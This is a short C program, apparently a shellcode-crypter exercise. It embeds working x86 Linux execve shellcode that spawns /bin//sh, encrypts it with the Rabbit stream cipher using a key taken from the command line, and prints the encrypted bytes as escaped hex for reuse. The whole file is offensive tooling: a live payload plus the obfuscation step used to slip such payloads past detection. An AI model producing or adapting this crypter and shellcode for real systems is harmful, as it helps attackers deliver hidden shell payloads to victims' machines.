#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include "rabbit.h"



int main(int argc, char *argv[])
{

    byte key[KEY_LEN];
    int i, flag, s;
    t_instance state;

    check_init_key(argv[1],key);

    //Shellcode of /bin//sh
    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    int const LEN=sizeof(shellcode);

    byte encrypted_shellcode[LEN],  decrypted_shellcode[LEN];

    //Encryption
    key_setup(&state, key);

    cipher(&state, shellcode, encrypted_shellcode, sizeof(shellcode));

    //Output of encrypted shellcode
    for (i=0;i<sizeof(encrypted_shellcode);i++)
        printf("\\x%02x", encrypted_shellcode[i]);
    printf("\n");

    return 0;
}


